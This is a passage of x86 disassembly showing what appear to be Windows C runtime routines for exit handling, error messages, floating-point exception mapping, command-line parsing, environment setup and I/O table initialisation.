  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
  422e02:	lea    eax,[ebp-0x10c]
  422e08:	sub    eax,0x3b
  422e0b:	push   0x3
  422e0d:	add    edi,eax
  422e0f:	push   0x428488
  422e14:	push   edi
  422e15:	call   0x423d90
  422e1a:	add    esp,0x10
  422e1d:	push   edi
  422e1e:	call   0x423ec0
  422e23:	push   DWORD PTR [esi+0x45c1cc]
  422e29:	mov    ebx,eax
  422e2b:	call   0x423ec0
  422e30:	lea    eax,[ebx+eax*1+0x1c]
  422e34:	pop    ecx
  422e35:	add    eax,0x3
  422e38:	pop    ecx
  422e39:	and    eax,0xfffffffc
  422e3c:	call   0x423900
  422e41:	mov    ebx,esp
  422e43:	push   0x42846c
  422e48:	push   ebx
  422e49:	call   0x423c90
  422e4e:	push   edi
  422e4f:	push   ebx
  422e50:	call   0x423ca0
  422e55:	push   0x428468
  422e5a:	push   ebx
  422e5b:	call   0x423ca0
  422e60:	push   DWORD PTR [esi+0x45c1cc]
  422e66:	push   ebx
  422e67:	call   0x423ca0
  422e6c:	push   0x12010
  422e71:	push   0x428440
  422e76:	push   ebx
  422e77:	call   0x423b92
  422e7c:	add    esp,0x2c
  422e7f:	jmp    0x422ea6
  422e81:	push   edx
  422e82:	lea    eax,[ebp+0x8]
  422e85:	push   eax
  422e86:	lea    esi,[esi+0x45c1cc]
  422e8c:	push   DWORD PTR [esi]
  422e8e:	call   0x423ec0
  422e93:	pop    ecx
  422e94:	push   eax
  422e95:	push   DWORD PTR [esi]
  422e97:	push   0xfffffff4
  422e99:	call   DWORD PTR ds:0x42803c
  422e9f:	push   eax
  422ea0:	call   DWORD PTR ds:0x428038
  422ea6:	lea    esp,[ebp-0x118]
  422eac:	mov    ecx,DWORD PTR [ebp-0x4]
  422eaf:	xor    ecx,DWORD PTR [ebp+0x4]
  422eb2:	call   0x423f7c
  422eb7:	pop    edi
  422eb8:	pop    esi
  422eb9:	pop    ebx
  422eba:	leave  
  422ebb:	ret    
  422ebc:	mov    eax,ds:0x45cabc
  422ec1:	cmp    eax,0x1
  422ec4:	je     0x422ed3
  422ec6:	test   eax,eax
  422ec8:	jne    0x422ef4
  422eca:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422ed1:	jne    0x422ef4
  422ed3:	push   0xfc
  422ed8:	call   0x422d45
  422edd:	mov    eax,ds:0x45cb08
  422ee2:	test   eax,eax
  422ee4:	pop    ecx
  422ee5:	je     0x422ee9
  422ee7:	call   eax
  422ee9:	push   0xff
  422eee:	call   0x422d45
  422ef3:	pop    ecx
  422ef4:	ret    
  422ef5:	push   ebp
  422ef6:	mov    ebp,esp
  422ef8:	push   ecx
  422ef9:	push   ebx
  422efa:	push   esi
  422efb:	push   edi
  422efc:	call   0x42375d
  422f01:	mov    edi,DWORD PTR [ebp+0x8]
  422f04:	mov    esi,eax
  422f06:	mov    edx,DWORD PTR [esi+0x54]
  422f09:	mov    eax,ds:0x45c2dc
  422f0e:	mov    ecx,edx
  422f10:	cmp    DWORD PTR [ecx],edi
  422f12:	je     0x422f21
  422f14:	lea    ebx,[eax+eax*2]
  422f17:	add    ecx,0xc
  422f1a:	lea    ebx,[edx+ebx*4]
  422f1d:	cmp    ecx,ebx
  422f1f:	jb     0x422f10
  422f21:	lea    eax,[eax+eax*2]
  422f24:	lea    eax,[edx+eax*4]
  422f27:	cmp    ecx,eax
  422f29:	jae    0x422f2f
  422f2b:	cmp    DWORD PTR [ecx],edi
  422f2d:	je     0x422f31
  422f2f:	xor    ecx,ecx
  422f31:	test   ecx,ecx
  422f33:	je     0x42304b
  422f39:	mov    ebx,DWORD PTR [ecx+0x8]
  422f3c:	test   ebx,ebx
  422f3e:	mov    DWORD PTR [ebp+0x8],ebx
  422f41:	je     0x42304b
  422f47:	cmp    ebx,0x5
  422f4a:	jne    0x422f58
  422f4c:	and    DWORD PTR [ecx+0x8],0x0
  422f50:	xor    eax,eax
  422f52:	inc    eax
  422f53:	jmp    0x423054
  422f58:	cmp    ebx,0x1
  422f5b:	je     0x423046
  422f61:	mov    eax,DWORD PTR [esi+0x58]
  422f64:	mov    DWORD PTR [ebp-0x4],eax
  422f67:	mov    eax,DWORD PTR [ebp+0xc]
  422f6a:	mov    DWORD PTR [esi+0x58],eax
  422f6d:	mov    eax,DWORD PTR [ecx+0x4]
  422f70:	cmp    eax,0x8
  422f73:	jne    0x423038
  422f79:	mov    edx,DWORD PTR ds:0x45c2d0
  422f7f:	mov    eax,ds:0x45c2d4
  422f84:	add    eax,edx
  422f86:	cmp    edx,eax
  422f88:	jge    0x422fb1
  422f8a:	lea    eax,[edx+edx*2]
  422f8d:	shl    eax,0x2
  422f90:	mov    edi,DWORD PTR [esi+0x54]
  422f93:	and    DWORD PTR [eax+edi*1+0x8],0x0
  422f98:	mov    edi,DWORD PTR ds:0x45c2d0
  422f9e:	mov    ebx,DWORD PTR ds:0x45c2d4
  422fa4:	inc    edx
  422fa5:	add    ebx,edi
  422fa7:	add    eax,0xc
  422faa:	cmp    edx,ebx
  422fac:	jl     0x422f90
  422fae:	mov    ebx,DWORD PTR [ebp+0x8]
  422fb1:	mov    ecx,DWORD PTR [ecx]
  422fb3:	cmp    ecx,0xc000008e
  422fb9:	mov    edi,DWORD PTR [esi+0x5c]
  422fbc:	jne    0x422fc7
  422fbe:	mov    DWORD PTR [esi+0x5c],0x83
  422fc5:	jmp    0x42302b
  422fc7:	cmp    ecx,0xc0000090
  422fcd:	jne    0x422fd8
  422fcf:	mov    DWORD PTR [esi+0x5c],0x81
  422fd6:	jmp    0x42302b
  422fd8:	cmp    ecx,0xc0000091
  422fde:	jne    0x422fe9
  422fe0:	mov    DWORD PTR [esi+0x5c],0x84
  422fe7:	jmp    0x42302b
  422fe9:	cmp    ecx,0xc0000093
  422fef:	jne    0x422ffa
  422ff1:	mov    DWORD PTR [esi+0x5c],0x85
  422ff8:	jmp    0x42302b
  422ffa:	cmp    ecx,0xc000008d
  423000:	jne    0x42300b
  423002:	mov    DWORD PTR [esi+0x5c],0x82
  423009:	jmp    0x42302b
  42300b:	cmp    ecx,0xc000008f
  423011:	jne    0x42301c
  423013:	mov    DWORD PTR [esi+0x5c],0x86
  42301a:	jmp    0x42302b
  42301c:	cmp    ecx,0xc0000092
  423022:	jne    0x42302b
  423024:	mov    DWORD PTR [esi+0x5c],0x8a
  42302b:	push   DWORD PTR [esi+0x5c]
  42302e:	push   0x8
  423030:	call   ebx
  423032:	pop    ecx
  423033:	mov    DWORD PTR [esi+0x5c],edi
  423036:	jmp    0x42303f
  423038:	and    DWORD PTR [ecx+0x8],0x0
  42303c:	push   eax
  42303d:	call   ebx
  42303f:	mov    eax,DWORD PTR [ebp-0x4]
  423042:	pop    ecx
  423043:	mov    DWORD PTR [esi+0x58],eax
  423046:	or     eax,0xffffffff
  423049:	jmp    0x423054
  42304b:	push   DWORD PTR [ebp+0xc]
  42304e:	call   DWORD PTR ds:0x428044
  423054:	pop    edi
  423055:	pop    esi
  423056:	pop    ebx
  423057:	leave  
  423058:	ret    
  423059:	cmp    DWORD PTR ds:0x45d26c,0x0
  423060:	jne    0x423067
  423062:	call   0x42449c
  423067:	push   esi
  423068:	mov    esi,DWORD PTR ds:0x45d274
  42306e:	test   esi,esi
  423070:	jne    0x423079
  423072:	mov    esi,0x4284a3
  423077:	jmp    0x4230be
  423079:	mov    al,BYTE PTR [esi]
  42307b:	cmp    al,0x22
  42307d:	jne    0x4230a7
  42307f:	inc    esi
  423080:	mov    al,BYTE PTR [esi]
  423082:	cmp    al,0x22
  423084:	je     0x4230b7
  423086:	test   al,al
  423088:	je     0x4230a0
  42308a:	movzx  eax,al
  42308d:	push   eax
  42308e:	call   0x423fbb
  423093:	test   eax,eax
  423095:	pop    ecx
  423096:	je     0x423099
  423098:	inc    esi
  423099:	inc    esi
  42309a:	mov    al,BYTE PTR [esi]
  42309c:	cmp    al,0x22
  42309e:	jne    0x423086
  4230a0:	cmp    BYTE PTR [esi],0x22
  4230a3:	jne    0x4230b8
  4230a5:	jmp    0x4230b7
  4230a7:	cmp    al,0x20
  4230a9:	jbe    0x4230b8
  4230ab:	inc    esi
  4230ac:	cmp    BYTE PTR [esi],0x20
  4230af:	ja     0x4230ab
  4230b1:	jmp    0x4230b8
  4230b3:	cmp    al,0x20
  4230b5:	ja     0x4230be
  4230b7:	inc    esi
  4230b8:	mov    al,BYTE PTR [esi]
  4230ba:	test   al,al
  4230bc:	jne    0x4230b3
  4230be:	mov    eax,esi
  4230c0:	pop    esi
  4230c1:	ret    
  4230c2:	push   ebx
  4230c3:	xor    ebx,ebx
  4230c5:	cmp    DWORD PTR ds:0x45d26c,ebx
  4230cb:	push   esi
  4230cc:	push   edi
  4230cd:	jne    0x4230d4
  4230cf:	call   0x42449c
  4230d4:	mov    esi,DWORD PTR ds:0x45cab4
  4230da:	xor    edi,edi
  4230dc:	cmp    esi,ebx
  4230de:	jne    0x4230f2
  4230e0:	jmp    0x423112
  4230e2:	cmp    al,0x3d
  4230e4:	je     0x4230e7
  4230e6:	inc    edi
  4230e7:	push   esi
  4230e8:	call   0x423ec0
  4230ed:	pop    ecx
  4230ee:	lea    esi,[esi+eax*1+0x1]
  4230f2:	mov    al,BYTE PTR [esi]
  4230f4:	cmp    al,bl
  4230f6:	jne    0x4230e2
  4230f8:	lea    eax,[edi*4+0x4]
  4230ff:	push   eax
  423100:	call   0x4245d2
  423105:	mov    edi,eax
  423107:	cmp    edi,ebx
  423109:	pop    ecx
  42310a:	mov    DWORD PTR ds:0x45cae4,edi
  423110:	jne    0x423117
  423112:	or     eax,0xffffffff
  423115:	jmp    0x42316f
  423117:	mov    esi,DWORD PTR ds:0x45cab4
  42311d:	push   ebp
  42311e:	jmp    0x42314a
  423120:	push   esi
  423121:	call   0x423ec0
  423126:	mov    ebp,eax
  423128:	inc    ebp
  423129:	cmp    BYTE PTR [esi],0x3d
  42312c:	pop    ecx
  42312d:	je     0x423148
  42312f:	push   ebp
  423130:	call   0x4245d2
  423135:	cmp    eax,ebx
  423137:	pop    ecx
  423138:	mov    DWORD PTR [edi],eax
  42313a:	je     0x423173
  42313c:	push   esi
  42313d:	push   eax
  42313e:	call   0x423c90
  423143:	pop    ecx
  423144:	pop    ecx
  423145:	add    edi,0x4
  423148:	add    esi,ebp
  42314a:	cmp    BYTE PTR [esi],bl
  42314c:	jne    0x423120
  42314e:	push   DWORD PTR ds:0x45cab4
  423154:	call   0x4244ba
  423159:	mov    DWORD PTR ds:0x45cab4,ebx
  42315f:	mov    DWORD PTR [edi],ebx
  423161:	mov    DWORD PTR ds:0x45d260,0x1
  42316b:	xor    eax,eax
  42316d:	pop    ecx
  42316e:	pop    ebp
  42316f:	pop    edi
  423170:	pop    esi
  423171:	pop    ebx
  423172:	ret    
  423173:	push   DWORD PTR ds:0x45cae4
  423179:	call   0x4244ba
  42317e:	mov    DWORD PTR ds:0x45cae4,ebx
  423184:	or     eax,0xffffffff
  423187:	jmp    0x42316d
  423189:	push   ebp
  42318a:	mov    ebp,esp
  42318c:	push   ecx
  42318d:	push   ebx
  42318e:	mov    ebx,DWORD PTR [ebp+0xc]
  423191:	xor    edx,edx
  423193:	cmp    DWORD PTR [ebp+0x8],edx
  423196:	push   edi
  423197:	mov    DWORD PTR [esi],edx
  423199:	mov    edi,ecx
  42319b:	mov    DWORD PTR [ebx],0x1
  4231a1:	je     0x4231ac
  4231a3:	mov    ecx,DWORD PTR [ebp+0x8]
  4231a6:	add    DWORD PTR [ebp+0x8],0x4
  4231aa:	mov    DWORD PTR [ecx],edi
  4231ac:	cmp    BYTE PTR [eax],0x22
  4231af:	jne    0x4231bf
  4231b1:	xor    ecx,ecx
  4231b3:	test   edx,edx
  4231b5:	sete   cl
  4231b8:	inc    eax
  4231b9:	mov    edx,ecx
  4231bb:	mov    cl,0x22
  4231bd:	jmp    0x4231ec
  4231bf:	inc    DWORD PTR [esi]
  4231c1:	test   edi,edi
  4231c3:	je     0x4231ca
  4231c5:	mov    cl,BYTE PTR [eax]
  4231c7:	mov    BYTE PTR [edi],cl
  4231c9:	inc    edi
  4231ca:	mov    cl,BYTE PTR [eax]
  4231cc:	movzx  ebx,cl
  4231cf:	inc    eax
  4231d0:	test   BYTE PTR [ebx+0x45cf21],0x4
  4231d7:	je     0x4231e5
  4231d9:	inc    DWORD PTR [esi]
  4231db:	test   edi,edi
  4231dd:	je     0x4231e4
  4231df:	mov    bl,BYTE PTR [eax]
  4231e1:	mov    BYTE PTR [edi],bl
  4231e3:	inc    edi
  4231e4:	inc    eax
  4231e5:	test   cl,cl
  4231e7:	mov    ebx,DWORD PTR [ebp+0xc]
  4231ea:	je     0x42321e
  4231ec:	test   edx,edx
  4231ee:	jne    0x4231ac
  4231f0:	cmp    cl,0x20
  4231f3:	je     0x4231fa
  4231f5:	cmp    cl,0x9
  4231f8:	jne    0x4231ac
  4231fa:	test   edi,edi
  4231fc:	je     0x423202
  4231fe:	and    BYTE PTR [edi-0x1],0x0
  423202:	and    DWORD PTR [ebp-0x4],0x0
  423206:	cmp    BYTE PTR [eax],0x0
  423209:	je     0x4232e5
  42320f:	mov    cl,BYTE PTR [eax]
  423211:	cmp    cl,0x20
  423214:	je     0x42321b
  423216:	cmp    cl,0x9
  423219:	jne    0x423221
  42321b:	inc    eax
  42321c:	jmp    0x42320f
  42321e:	dec    eax
  42321f:	jmp    0x423202
  423221:	cmp    BYTE PTR [eax],0x0
  423224:	je     0x4232e5
  42322a:	cmp    DWORD PTR [ebp+0x8],0x0
  42322e:	je     0x423239
  423230:	mov    ecx,DWORD PTR [ebp+0x8]
  423233:	add    DWORD PTR [ebp+0x8],0x4
  423237:	mov    DWORD PTR [ecx],edi
  423239:	inc    DWORD PTR [ebx]
  42323b:	xor    ebx,ebx
  42323d:	inc    ebx
  42323e:	xor    edx,edx
  423240:	jmp    0x423244
  423242:	inc    eax
  423243:	inc    edx
  423244:	cmp    BYTE PTR [eax],0x5c
  423247:	je     0x423242
  423249:	cmp    BYTE PTR [eax],0x22
  42324c:	jne    0x423274
  42324e:	test   dl,0x1
  423251:	jne    0x423272
  423253:	cmp    DWORD PTR [ebp-0x4],0x0
  423257:	je     0x423265
  423259:	lea    ecx,[eax+0x1]
  42325c:	cmp    BYTE PTR [ecx],0x22
  42325f:	jne    0x423265
  423261:	mov    eax,ecx
  423263:	jmp    0x423267
  423265:	xor    ebx,ebx
  423267:	xor    ecx,ecx
  423269:	cmp    DWORD PTR [ebp-0x4],ecx
  42326c:	sete   cl
  42326f:	mov    DWORD PTR [ebp-0x4],ecx
  423272:	shr    edx,1
  423274:	test   edx,edx
  423276:	je     0x423285
  423278:	test   edi,edi
  42327a:	je     0x423280
  42327c:	mov    BYTE PTR [edi],0x5c
  42327f:	inc    edi
  423280:	inc    DWORD PTR [esi]
  423282:	dec    edx
  423283:	jne    0x423278
  423285:	mov    cl,BYTE PTR [eax]
  423287:	test   cl,cl
  423289:	je     0x4232d3
  42328b:	cmp    DWORD PTR [ebp-0x4],0x0
  42328f:	jne    0x42329b
  423291:	cmp    cl,0x20
  423294:	je     0x4232d3
  423296:	cmp    cl,0x9
  423299:	je     0x4232d3
  42329b:	test   ebx,ebx
  42329d:	je     0x4232cd
  42329f:	test   edi,edi
  4232a1:	je     0x4232bc
  4232a3:	movzx  edx,cl
  4232a6:	test   BYTE PTR [edx+0x45cf21],0x4
  4232ad:	je     0x4232b5
  4232af:	mov    BYTE PTR [edi],cl
  4232b1:	inc    edi
  4232b2:	inc    eax
  4232b3:	inc    DWORD PTR [esi]
  4232b5:	mov    cl,BYTE PTR [eax]
  4232b7:	mov    BYTE PTR [edi],cl
  4232b9:	inc    edi
  4232ba:	jmp    0x4232cb
  4232bc:	movzx  ecx,cl
  4232bf:	test   BYTE PTR [ecx+0x45cf21],0x4
  4232c6:	je     0x4232cb
  4232c8:	inc    eax
  4232c9:	inc    DWORD PTR [esi]
  4232cb:	inc    DWORD PTR [esi]
  4232cd:	inc    eax
  4232ce:	jmp    0x42323b
  4232d3:	test   edi,edi
  4232d5:	je     0x4232db
  4232d7:	and    BYTE PTR [edi],0x0
  4232da:	inc    edi
  4232db:	inc    DWORD PTR [esi]
  4232dd:	mov    ebx,DWORD PTR [ebp+0xc]
  4232e0:	jmp    0x423206
  4232e5:	mov    eax,DWORD PTR [ebp+0x8]
  4232e8:	test   eax,eax
  4232ea:	je     0x4232ef
  4232ec:	and    DWORD PTR [eax],0x0
  4232ef:	inc    DWORD PTR [ebx]
  4232f1:	pop    edi
  4232f2:	pop    ebx
  4232f3:	leave  
  4232f4:	ret    
  4232f5:	push   ebp
  4232f6:	mov    ebp,esp
  4232f8:	push   ecx
  4232f9:	push   ecx
  4232fa:	push   ebx
  4232fb:	push   esi
  4232fc:	push   edi
  4232fd:	xor    edi,edi
  4232ff:	cmp    DWORD PTR ds:0x45d26c,edi
  423305:	jne    0x42330c
  423307:	call   0x42449c
  42330c:	and    BYTE PTR ds:0x45cc14,0x0
  423313:	push   0x104
  423318:	mov    esi,0x45cb10
  42331d:	push   esi
  42331e:	push   edi
  42331f:	call   DWORD PTR ds:0x428040
  423325:	mov    eax,ds:0x45d274
  42332a:	cmp    eax,edi
  42332c:	mov    DWORD PTR ds:0x45caf4,esi
  423332:	je     0x42333b
  423334:	cmp    BYTE PTR [eax],0x0
  423337:	mov    ebx,eax
  423339:	jne    0x42333d
  42333b:	mov    ebx,esi
  42333d:	lea    eax,[ebp-0x4]
  423340:	push   eax
  423341:	push   edi
  423342:	lea    esi,[ebp-0x8]
  423345:	xor    ecx,ecx
  423347:	mov    eax,ebx
  423349:	call   0x423189
  42334e:	mov    esi,DWORD PTR [ebp-0x4]
  423351:	mov    eax,DWORD PTR [ebp-0x8]
  423354:	shl    esi,0x2
  423357:	add    eax,esi
  423359:	push   eax
  42335a:	call   0x4245d2
  42335f:	mov    edi,eax
  423361:	add    esp,0xc
  423364:	test   edi,edi
  423366:	jne    0x42336d
  423368:	or     eax,0xffffffff
  42336b:	jmp    0x423392
  42336d:	lea    eax,[ebp-0x4]
  423370:	push   eax
  423371:	lea    ecx,[esi+edi*1]
  423374:	push   edi
  423375:	lea    esi,[ebp-0x8]
  423378:	mov    eax,ebx
  42337a:	call   0x423189
  42337f:	mov    eax,DWORD PTR [ebp-0x4]
  423382:	dec    eax
  423383:	pop    ecx
  423384:	mov    ds:0x45cad8,eax
  423389:	pop    ecx
  42338a:	mov    DWORD PTR ds:0x45cadc,edi
  423390:	xor    eax,eax
  423392:	pop    edi
  423393:	pop    esi
  423394:	pop    ebx
  423395:	leave  
  423396:	ret    
  423397:	push   ecx
  423398:	push   ecx
  423399:	mov    eax,ds:0x45cc18
  42339e:	push   ebx
  42339f:	push   ebp
  4233a0:	push   esi
  4233a1:	push   edi
  4233a2:	mov    edi,DWORD PTR ds:0x428058
  4233a8:	xor    ebx,ebx
  4233aa:	xor    esi,esi
  4233ac:	cmp    eax,ebx
  4233ae:	push   0x2
  4233b0:	pop    ebp
  4233b1:	jne    0x4233e0
  4233b3:	call   edi
  4233b5:	mov    esi,eax
  4233b7:	cmp    esi,ebx
  4233b9:	je     0x4233c7
  4233bb:	mov    DWORD PTR ds:0x45cc18,0x1
  4233c5:	jmp    0x4233e5
  4233c7:	call   DWORD PTR ds:0x428014
  4233cd:	cmp    eax,0x78
  4233d0:	jne    0x4233db
  4233d2:	mov    eax,ebp
  4233d4:	mov    ds:0x45cc18,eax
  4233d9:	jmp    0x4233e0
  4233db:	mov    eax,ds:0x45cc18
  4233e0:	cmp    eax,0x1
  4233e3:	jne    0x423462
  4233e5:	cmp    esi,ebx
  4233e7:	jne    0x4233f1
  4233e9:	call   edi
  4233eb:	mov    esi,eax
  4233ed:	cmp    esi,ebx
  4233ef:	je     0x42346a
  4233f1:	cmp    WORD PTR [esi],bx
  4233f4:	mov    eax,esi
  4233f6:	je     0x423406
  4233f8:	add    eax,ebp
  4233fa:	cmp    WORD PTR [eax],bx
  4233fd:	jne    0x4233f8
  4233ff:	add    eax,ebp
  423401:	cmp    WORD PTR [eax],bx
  423404:	jne    0x4233f8
  423406:	mov    edi,DWORD PTR ds:0x428054
  42340c:	push   ebx
  42340d:	push   ebx
  42340e:	push   ebx
  42340f:	sub    eax,esi
  423411:	push   ebx
  423412:	sar    eax,1
  423414:	inc    eax
  423415:	push   eax
  423416:	push   esi
  423417:	push   ebx
  423418:	push   ebx
  423419:	mov    DWORD PTR [esp+0x34],eax
  42341d:	call   edi
  42341f:	mov    ebp,eax
  423421:	cmp    ebp,ebx
  423423:	je     0x423457
  423425:	push   ebp
  423426:	call   0x4245d2
  42342b:	cmp    eax,ebx
  42342d:	pop    ecx
  42342e:	mov    DWORD PTR [esp+0x10],eax
  423432:	je     0x423457
  423434:	push   ebx
  423435:	push   ebx
  423436:	push   ebp
  423437:	push   eax
  423438:	push   DWORD PTR [esp+0x24]
  42343c:	push   esi
  42343d:	push   ebx
  42343e:	push   ebx
  42343f:	call   edi
  423441:	test   eax,eax
  423443:	jne    0x423453
  423445:	push   DWORD PTR [esp+0x10]
  423449:	call   0x4244ba
  42344e:	pop    ecx
  42344f:	mov    DWORD PTR [esp+0x10],ebx
  423453:	mov    ebx,DWORD PTR [esp+0x10]
  423457:	push   esi
  423458:	call   DWORD PTR ds:0x428050
  42345e:	mov    eax,ebx
  423460:	jmp    0x4234b2
  423462:	cmp    eax,ebp
  423464:	je     0x42346e
  423466:	cmp    eax,ebx
  423468:	je     0x42346e
  42346a:	xor    eax,eax
  42346c:	jmp    0x4234b2
  42346e:	call   DWORD PTR ds:0x42804c
  423474:	mov    esi,eax
  423476:	cmp    esi,ebx
  423478:	je     0x42346a
  42347a:	cmp    BYTE PTR [esi],bl
  42347c:	je     0x423488
  42347e:	inc    eax
  42347f:	cmp    BYTE PTR [eax],bl
  423481:	jne    0x42347e
  423483:	inc    eax
  423484:	cmp    BYTE PTR [eax],bl
  423486:	jne    0x42347e
  423488:	sub    eax,esi
  42348a:	inc    eax
  42348b:	mov    ebp,eax
  42348d:	push   ebp
  42348e:	call   0x4245d2
  423493:	mov    edi,eax
  423495:	cmp    edi,ebx
  423497:	pop    ecx
  423498:	jne    0x42349e
  42349a:	xor    edi,edi
  42349c:	jmp    0x4234a9
  42349e:	push   ebp
  42349f:	push   esi
  4234a0:	push   edi
  4234a1:	call   0x4245f0
  4234a6:	add    esp,0xc
  4234a9:	push   esi
  4234aa:	call   DWORD PTR ds:0x428048
  4234b0:	mov    eax,edi
  4234b2:	pop    edi
  4234b3:	pop    esi
  4234b4:	pop    ebp
  4234b5:	pop    ebx
  4234b6:	pop    ecx
  4234b7:	pop    ecx
  4234b8:	ret    
  4234b9:	sub    esp,0x48
  4234bc:	push   ebx
  4234bd:	mov    ebx,0x480
  4234c2:	push   ebx
  4234c3:	call   0x4245d2
  4234c8:	test   eax,eax
  4234ca:	pop    ecx
  4234cb:	jne    0x4234d5
  4234cd:	or     eax,0xffffffff
  4234d0:	jmp    0x4236b2
  4234d5:	mov    ds:0x45d160,eax
  4234da:	mov    DWORD PTR ds:0x45d148,0x20
  4234e4:	lea    ecx,[eax+0x480]
  4234ea:	jmp    0x42350a
  4234ec:	and    BYTE PTR [eax+0x4],0x0
  4234f0:	or     DWORD PTR [eax],0xffffffff
  4234f3:	and    DWORD PTR [eax+0x8],0x0
  4234f7:	mov    BYTE PTR [eax+0x5],0xa
  4234fb:	mov    ecx,DWORD PTR ds:0x45d160
  423501:	add    eax,0x24
  423504:	add    ecx,0x480
  42350a:	cmp    eax,ecx
  42350c:	jb     0x4234ec
  42350e:	push   ebp
  42350f:	push   esi
  423510:	push   edi
  423511:	lea    eax,[esp+0x14]
  423515:	push   eax
  423516:	call   DWORD PTR ds:0x428020
  42351c:	cmp    WORD PTR [esp+0x46],0x0
  423522:	je     0x423611
  423528:	mov    eax,DWORD PTR [esp+0x48]
  42352c:	test   eax,eax
  42352e:	je     0x423611
  423534:	mov    edi,DWORD PTR [eax]
  423536:	lea    ebp,[eax+0x4]
  423539:	lea    eax,[edi+ebp*1]
  42353c:	mov    DWORD PTR [esp+0x10],eax
  423540:	mov    eax,0x800
  423545:	cmp    edi,eax
  423547:	jl     0x42354b
  423549:	mov    edi,eax
  42354b:	cmp    DWORD PTR ds:0x45d148,edi
  423551:	jge    0x4235a1
  423553:	mov    esi,0x45d164
  423558:	push   ebx
  423559:	call   0x4245d2
  42355e:	test   eax,eax
  423560:	pop    ecx
  423561:	je     0x42359b
  423563:	add    DWORD PTR ds:0x45d148,0x20
